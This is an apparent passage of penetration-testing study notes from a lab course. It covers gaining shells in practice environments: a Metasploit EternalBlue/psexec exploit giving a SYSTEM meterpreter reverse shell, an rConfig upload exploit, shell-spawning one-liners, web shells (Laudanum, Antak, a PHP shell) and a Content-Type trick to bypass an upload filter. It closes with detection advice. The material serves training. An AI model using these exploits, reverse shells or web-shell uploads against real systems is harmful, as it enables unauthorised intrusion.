NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29
```

It is running `Windows Server 2016 Standard 6.3`. We have the hostname now, and we know it is not in a domain and is running several services. Now that we have gathered some information let's determine our potential exploit path.

`IIS` could be a potential path, attempting to access the host over SMB utilizing a tool like Impacket or authenticating if we had credentials could do it, and from an OS perspective, there may be a route for an RCE as well. MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016.

Let's validate that using a builtin auxiliary check from `Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

2. Search for and decide on an exploit path : Open `msfconsole` and search for EternalBlue. Set the RHOSTS field with the target's IP address and initiate the scan. When ready, type `run`.

```shell
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.

3. Select Exploit & Payload, then Deliver : 

```shell
msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

```shell
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

Be sure to set your payload options correctly before running the exploit. Any options that have `Required` set to yes will be a necessary space to fill. In this instance, we need to ensure that our `RHOSTS, LHOST, and LPORT` fields are correctly set.

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
```

This time, we kept it simple and just used a `windows/meterpreter/reverse_tcp` payload. You can change this as you wish for a different shell type or obfuscate your attack more, as shown in the previous payloads sections.

4. Execute Attack, and Receive A Callback :

```shell
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

Success! We have landed our exploit and gained a shell session.

5. Identify the Native Shell :

```shell
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

When we executed the Meterpreter command `shell`, it started another process on the host and dropped us into a system shell.

We are fortunate with Windows hosts to have not one but two choices for shells to utilize by default. Now you may be wondering :

`Which one is the right one to use?`

Use `CMD` when:

- You are on an older host that may not include PowerShell.
- When you only require simple interactions/access to the host.
- When you plan to use simple batch files, net commands, or MS-DOS native tools.
- When you believe that execution policies may affect your ability to run scripts or other actions on the host.

Use `PowerShell` when:

- You are planning to utilize cmdlets or other custom-built scripts.
- When you wish to interact with .NET objects instead of text output.
- When being stealthy is of lesser concern.
- If you are planning to interact with cloud-based services and hosts.
- If your scripts set and use Aliases.

## Infiltrating Unix/Linux : 

W3Techs maintains an ongoing OS usage statistics [study](https://w3techs.com/technologies/overview/operating_system). This study reports that over `70%` of websites (webservers) run on a Unix-based system. For us, this means we can significantly benefit from continuing to grow our knowledge of Unix/Linux and how we can gain shell sessions on these environments to potentially pivot further within an environment.

When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following :

- What distribution of Linux is the system running ?
- What shell & programming languages exist on the system ?
- What function is the system serving for the network environment it is on ?
- What application is the system hosting ?
- Are there any known vulnerabilities ?

As in most engagements, we will start with an initial enumeration of the system using `Nmap`.

```shell
NolanCarougeHTB@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Keeping our goal of `gaining a shell session` in mind, we must establish some next steps after examining our scan output.

`What information could we gather from the output ?`

Considering we can see the system is listening on ports 80 (`HTTP`), 443 (`HTTPS`), 3306 (`MySQL`), and 21 (`FTP`), it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (`Apache 2.4.6` and `PHP 7.2.34` ) and the distribution of Linux running on the system (`CentOS`).

Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible.

Here we discover a network configuration management tool called [rConfig](https://www.rconfig.com).

Take a close look at the bottom of the web login page, and we can see the rConfig version number (`3.9.6`). We should use this information to start looking for any `CVEs`, `publicly available exploits`, and `proof of concepts` (`PoCs`).

We can use Metasploit's search functionality to see if any exploit modules can get us a shell session on the target.

```shell
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution
```

In msfconsole, we can manually load the exploit using the command :

```shell
msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
```

With this exploit selected, we can list the options, input the proper settings specific to our network environment, and launch the exploit.

```shell
msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg
```

We can see from the steps outlined in the exploitation process that this exploit :

- Checks for the vulnerable version of rConfig
- Authenticates with the rConfig web login
- Uploads a PHP-based payload for a reverse shell connection
- Deletes the payload
- Leaves us with a Meterpreter shell session

```shell
meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

We can drop into a system shell (`shell`) to gain access to the target system as if we were logged in and open a CMD.exe console.

When we drop into the system shell, we notice that no prompt is present, yet we can still issue some system commands. This is a shell typically referred to as a `non-tty shell`.

We can manually spawn a TTY shell using Python if it is present on the system. To spawn the TTY shell session using Python, we type the following command :

```shell
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

## Spawning Interactive Shells : 

At the end of the last section, we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from.

There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell.

```shell
/bin/sh -i 
```
This command will execute the shell interpreter specified in the path in interactive mode (`-i`).

If the programming language [Perl](https://www.perl.org) is present on the system, these commands will execute the shell interpreter specified.

```shell
perl —e 'exec "/bin/sh";'
```

```shell
perl: exec "/bin/sh";
```

The command directly above should be run from a script.

If the programming language [Ruby](https://www.ruby-lang.org/en/) is present on the system, this command will execute the shell interpreter specified :

```shell
ruby: exec "/bin/sh"
```

The command directly above should be run from a script.

If the programming language [Lua](https://www.lua.org) is present on the system, we can use the `os.execute` method to execute the shell interpreter specified using the full command below :

```shell
lua: os.execute('/bin/sh')
```

The command directly above should be run from a script.

[AWK](https://man7.org/linux/man-pages/man1/awk.1p.html) is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. This is shown in the short awk script below :

```shell
awk 'BEGIN {system("/bin/sh")}'
```

[Find](https://man7.org/linux/man-pages/man1/find.1.html) is a command present on most Unix/Linux systems widely used to search for & through files and directories using various criteria. It can also be used to execute applications and invoke a shell interpreter.

```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

This use of the find command is searching for any file listed after the `-name` option, then it executes `awk` (`/bin/awk`) and runs the same script we discussed in the awk section to execute a shell interpreter.

```shell
find . -exec /bin/sh \; -quit
```

This use of the find command uses the execute option (`-exec`) to initiate the shell interpreter directly.

Yes, we can set the shell interpreter language from within the popular command-line-based text-editor `VIM`.

```shell
vim -c ':!/bin/sh'
```

In addition to knowing about all the options listed above, we should be mindful of the permissions we have with the shell session's account. We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary :

```shell
ls -la <path/to/fileorbinary>
```

We can also attempt to run this command to check what `sudo` permissions the account we landed on has :

```shell
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

## Introduction to Web Shells :

Web applications are often the majority of what we see exposed during an external network assessment and often present an enormous attack surface.

A `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server. Again, to gain remote code execution via web shell, we must first find a website or web application vulnerability that can give us file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server.

## Laudanum, One Webshell to Rule Them All : 

Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more.

The Laudanum files can be found in the `/usr/share/laudanum` directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run.

For specific files such as the shells, you must edit the file first to insert your `attacking` host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell.

Now that we understand what Laudanum is and how it works, let's look at a web application we have found in our lab environment and see if we can run a web shell.

```shell
NolanCarougeHTB@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Add your IP address to the `allowedIps` variable on line `59`.

Select your shell file and hit upload on the website.

Once the upload is successful, you will need to navigate to your web shell to utilize its functions. The image below shows us how to do it. As seen from the last image, our shell was uploaded to the `\\files\` directory, and the name was kept the same. This won't always be the case.

With this particular web application, our file went to `status.inlanefreight.local\\files\demo.aspx`.

## Antak Webshell : 

One great resource to use in learning is `IPPSEC's` blog site [ippsec.rocks](https://ippsec.rocks/?#). The site is a powerful learning tool. Take, for example, the concept of web shells. We can use his site to type in the concept we want to learn, like aspx.

`How does aspx work ?`

`Active Server Page Extended` (`ASPX`) is a file type/extension written for [Microsoft's ASP.NET Framework](https://docs.microsoft.com/en-us/aspnet/overview). On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML.

Antak is a web shell built-in ASP.Net included within the [Nishang project](https://github.com/samratashok/nishang). Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server.

The Antak files can be found in the `/usr/share/nishang/Antak-WebShell` directory.

```shell
NolanCarougeHTB@htb[/htb]$ ls /usr/share/nishang/Antak-WebShell

antak.aspx  Readme.md
```

Antak web shell functions like a Powershell Console. However, it will execute each command as a new process.

```shell
NolanCarougeHTB@htb[/htb]$ cp /usr/share/nishang/Antak-WebShell/antak.aspx /home/administrator/Upload.aspx
```

Make sure you set credentials for access to the web shell. Modify `line 14`, adding a user and password.

For the sake of demonstrating the tool, we are uploading it to the same status portal we used for Laudanum.

## PHP Web Shells : 

Hypertext Preprocessor or [PHP](https://www.php.net) is an open-source general-purpose scripting language typically used as part of a web stack that powers a website.

We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a `.php` file. Our goal is to upload the PHP web shell. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing `Burp Suite`.

Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. `127.0.0.1` will go in the IP address field, and `8080` will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).

Our goal is to change the `content-type` to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can navigate to that file and have our web shell.

With Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell.

![[burp.webp]]

We will change Content-type from `application/x-php` to `image/gif`. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction.

We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server :

`/images/vendor/connect.php`

When utilizing web shells, consider the below potential issues that may arise during your penetration testing process :

- Web applications sometimes automatically delete files after a pre-defined period
- Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. `whoami && hostname`), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
- Greater chance of leaving behind proof that we were successful in our attack

## Detection & Prevention : 

When it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Let's take a second to talk about the [MITRE ATT&CK Framework](https://attack.mitre.org/)

The `ATT&CK Framework` as defined by MITRE, is "`a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations`."

Keeping the framework in mind, three of the most notable techniques we can tie to Shells & Payloads are listed below in the table with descriptions.

![[mitre.png]]

Events To Watch For :

- `File uploads`: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser.
- `Suspicious non-admin user actions`: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. 
- `Anomalous network sessions`: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork

Developing & maintaining visual network topology diagrams can help visualize network traffic flow. Newer tools like [netbrain](https://www.netbraintech.com) may be good to research as they combine visual diagraming that can be achieved with tools like [Draw.io](https://draw.io), documentation and remote management. Interactive visual network topologies allow you to interact with the routers, network firewalls, IDS/IPS appliances, switches, and hosts (clients).

Keep in mind that if a payload is successfully executed, it will need to communicate over the network, so this is why network visibility is essential within the context of shells & payloads. Having a network security appliance capable of [deep packet inspection](https://en.wikipedia.org/wiki/Deep_packet_inspection) can often act as an anti-virus for the network.

`End devices` are the devices that connect at the "end" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be :

- Workstations (employees computers)
- Servers (providing various services on the network)
- Printers
- Network Attached Storage (NAS)
- Cameras
- Smart TVs
- Smart Speakers

We should prioritize the protection of these kinds of devices, especially those that run an operating system with a `CLI` that can be remotely accessed.

On `Windows` systems, `Windows Defender` (also known as Windows Security or Microsoft Defender) is present at install and should be left enabled.

Consider the list below when considering what implementations you can put in place to mitigate many of these vectors or exploits.

- `Application Sandboxing`: By sandboxing your applications that are exposed to the world, you can limit the scope of access and damage an attacker can perform if they find a vulnerability or misconfiguration in the application.
- `Least Privilege Permission Policies`: Limiting the permissions users have can go a long way to help stop unauthorized access or compromise.
- `Host Segmentation & Hardening`: Properly hardening hosts and segregating any hosts that require exposure to the internet can help ensure an attacker cannot easily hop in and move laterally into your network if they gain access to a boundary host. 
- `Physical and Application Layer Firewalls`: Firewalls can be powerful tools if appropriately implemented. 